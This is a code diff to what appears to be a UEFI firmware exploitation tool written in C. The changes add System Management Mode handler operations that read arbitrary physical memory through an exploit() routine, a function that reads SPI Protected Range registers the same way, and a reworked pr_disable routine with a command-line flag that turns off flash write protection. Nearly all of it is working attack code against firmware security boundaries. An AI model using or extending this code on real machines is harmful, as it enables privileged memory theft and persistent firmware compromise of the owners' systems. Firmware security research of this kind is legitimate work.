@@ -35,7 +35,10 @@
 #define SMM_OP_GET_SMRAM_ADDR   6   // return SMRAM region address
 #define SMM_OP_GET_SMST_ADDR    7   // return EFI_SMM_SYSTEM_TABLE2 address
 #define SMM_OP_GET_MEM_INFO     8   // return physical memory information
-#define SMM_OP_TEST             9
+#define SMM_OP_READ_BYTE        9
+#define SMM_OP_READ_WORD        10
+#define SMM_OP_READ_DWORD       11
+#define SMM_OP_TEST             12
 
 // default size for TSEG/HSEG
 #define SMRAM_SIZE 0x800000
@@ -107,6 +110,27 @@ typedef struct _SMM_HANDLER_CONTEXT
             unsigned long long addr;
 
         } smst_addr;
+
+        struct // for SMM_OP_READ_BYTE
+        {
+            void *addr;
+            unsigned char val;
+
+        } byte;
+
+        struct // for SMM_OP_READ_WORD
+        {
+            void *addr;
+            unsigned short val;
+
+        } word;
+
+        struct // for SMM_OP_READ_DWORD
+        {
+            void *addr;
+            unsigned int val;
+
+        } dword;
 
         struct // for SMM_OP_TEST
         {
@@ -316,9 +340,30 @@ static void smm_handler(void *context)
             }
         }        
     }
+    else if (handler_context->op == SMM_OP_READ_BYTE)
+    {
+        // read byte from physical memory
+        handler_context->byte.val = *(unsigned char *)handler_context->byte.addr;
+        
+        status = 0;
+    }
+    else if (handler_context->op == SMM_OP_READ_WORD)
+    {
+        // read word from physical memory
+        handler_context->word.val = *(unsigned short *)handler_context->word.addr;
+        
+        status = 0;
+    }
+    else if (handler_context->op == SMM_OP_READ_DWORD)
+    {
+        // read dword from physical memory
+        handler_context->dword.val = *(unsigned int *)handler_context->dword.addr;
+        
+        status = 0;
+    }
     else if (handler_context->op == SMM_OP_TEST)
     {
-        _vmread(0);
+        // ...
     }
 
     handler_context->status = status;    
@@ -803,6 +848,60 @@ _end:
     free(context);
 
     return ret;
+}
+//--------------------------------------------------------------------------------------
+int phys_mem_read_val(
+    int target, PUEFI_EXPL_TARGET custom_target,
+    void *addr, data_width size, void *val)
+{
+    SMM_HANDLER_CONTEXT context;
+    memset(&context, 0, sizeof(context));
+
+    if (size == U8)
+    {
+        context.op = SMM_OP_READ_BYTE;
+        context.byte.addr = addr;
+    }
+    else if (size == U16)
+    {
+        context.op = SMM_OP_READ_WORD;
+        context.word.addr = addr;
+    }
+    else if (size == U32)
+    {
+        context.op = SMM_OP_READ_DWORD;
+        context.dword.addr = addr;
+    }
+    else
+    {
+        printf(__FUNCTION__"() ERROR: Invalid data size\n");
+        return -1;
+    }
+
+    // run exploitation to read a value from physical memory
+    if (exploit(target, custom_target, &context, NULL, true) == 0)
+    {
+        if (size == U8)
+        {
+            *(unsigned char *)val = context.byte.val;
+        }
+        else if (size == U16)
+        {
+            *(unsigned short *)val = context.word.val;
+        }
+        else if (size == U32)
+        {
+            *(unsigned int *)val = context.dword.val;
+        }        
+
+        return 0;
+    }
+    else
+    {
+        printf(__FUNCTION__"() ERROR: exploit() fails\n");
+    }
+
+    return -1;
 }
 //--------------------------------------------------------------------------------------
 unsigned long long smram_addr(int target, PUEFI_EXPL_TARGET custom_target)
@@ -1638,6 +1737,57 @@ int boot_script_table_addr(
     return 0;
 }
 //--------------------------------------------------------------------------------------
+int pr_get(
+    int target, PUEFI_EXPL_TARGET custom_target,
+    unsigned int *pr0_val, unsigned int *pr1_val, 
+    unsigned int *pr2_val, unsigned int *pr3_val, 
+    unsigned int *pr4_val)
+{
+    unsigned long long RCBA = 0;
+
+    // get Root Complex Base Address register value
+    if (!uefi_expl_pci_read(LPC_RCBA, U32, &RCBA))
+    {
+        printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
+        return -1;
+    }
+
+    // get Root Complex Register Block address
+    unsigned long long rcrb_addr = RCBA & 0xffffc000;
+
+    if (rcrb_addr == 0 || rcrb_addr > 0xfffff000)
+    {
+        printf(__FUNCTION__"() ERROR: Invalid RCBA value\n");
+        return -1;
+    }
+
+    struct
+    {
+        unsigned long long addr;
+        unsigned int *val;
+
+    } pr_regs[] = { { rcrb_addr + PR0, pr0_val },
+                    { rcrb_addr + PR1, pr1_val },
+                    { rcrb_addr + PR2, pr2_val },
+                    { rcrb_addr + PR3, pr3_val },
+                    { rcrb_addr + PR4, pr4_val } };
+
+    for (int i = 0; i < 5; i += 1)
+    {
+        *pr_regs[i].val = 0;
+
+        // read single PRx register
+        if (phys_mem_read_val(
+            target, custom_target, (void *)pr_regs[i].addr, U32, pr_regs[i].val) != 0)
+        {
+            printf(__FUNCTION__"() ERROR: phys_mem_read_val() fails\n");
+            return -1;
+        }
+    }    
+
+    return 0;
+}
+//--------------------------------------------------------------------------------------
 // boot script table opcodes
 #define BOOT_SCRIPT_IO_WRITE_OPCODE                 0x00
 #define BOOT_SCRIPT_IO_READ_WRITE_OPCODE            0x01
@@ -1650,17 +1800,38 @@ int boot_script_table_addr(
 #define BOOT_SCRIPT_DISPATCH_OPCODE                 0x08
 #define BOOT_SCRIPT_MEM_POLL_OPCODE                 0x09
 
-int disable_PRx(int target, PUEFI_EXPL_TARGET custom_target)
+int pr_disable(int target, PUEFI_EXPL_TARGET custom_target)
 {
     int ret = -1;
     unsigned long long bootscript_addr = 0, RCBA = 0;
     unsigned int bootscript_size = 0, ptr = 2;
+    unsigned int pr0_val = 0, pr1_val = 0, pr2_val = 0, pr3_val = 0, pr4_val = 0;
+
+    // get current values of PRx registers
+    if (pr_get(target, custom_target, &pr0_val, &pr1_val, &pr2_val, &pr3_val, &pr4_val) != 0)
+    {
+        printf(__FUNCTION__"() ERROR: pr_get() fails\n");
+        return -1;
+    }
+
+    printf(" * PR0 = 0x%.8x\n", pr0_val);
+    printf(" * PR1 = 0x%.8x\n", pr1_val);
+    printf(" * PR2 = 0x%.8x\n", pr2_val);
+    printf(" * PR3 = 0x%.8x\n", pr3_val);
+    printf(" * PR4 = 0x%.8x\n", pr4_val);
+
+    // check if any protected ranges are set
+    if (pr0_val == 0 && pr1_val == 0 && pr2_val == 0 && pr3_val == 0 && pr4_val == 0)
+    {
+        printf("SPI Protected Ranges flash write protection is not enabled\n");
+        return 0;
+    }
 
     // get Root Complex Base Address register value
     if (!uefi_expl_pci_read(LPC_RCBA, U32, &RCBA))
     {
         printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
-        goto _end;
+        return -1;
     }
 
     // get Root Complex Register Block address
@@ -1800,8 +1971,7 @@ int _tmain(int argc, _TCHAR* argv[])
     void *mem_read = NULL, *mem_write = NULL;
     bool use_dse_bypass = false, use_test = false;
     bool use_smram_dump = false, use_mem_dump = false;
-    bool use_ept_find = false;
-    bool use_disable_pr = false;
+    bool use_ept_find = false, use_pr_disable = false;
     
     SMM_HANDLER_CONTEXT context;
     memset(&context, 0, sizeof(context));
@@ -1880,10 +2050,10 @@ int _tmain(int argc, _TCHAR* argv[])
             
             i += 1;
         }
-        else if (!strcmp(argv[i], "--disable-pr"))
+        else if (!strcmp(argv[i], "--pr-disable"))
         {
             // disable PRx flash write protection
-            use_disable_pr = true;
+            use_pr_disable = true;
         }
         else if (!strcmp(argv[i], "--length") && i < argc - 1)
         {
@@ -2094,10 +2264,10 @@ int _tmain(int argc, _TCHAR* argv[])
                     // dump EPT tables
                     ret = ept_dump(target, &custom_target, pml4_addr, data_file);
                 }
-                else if (use_disable_pr)
+                else if (use_pr_disable)
                 {
                     // disable SPI protected ranges
-                    ret = disable_PRx(target, &custom_target);
+                    ret = pr_disable(target, &custom_target);
                 }
                 else if (use_smram_dump)
                 {
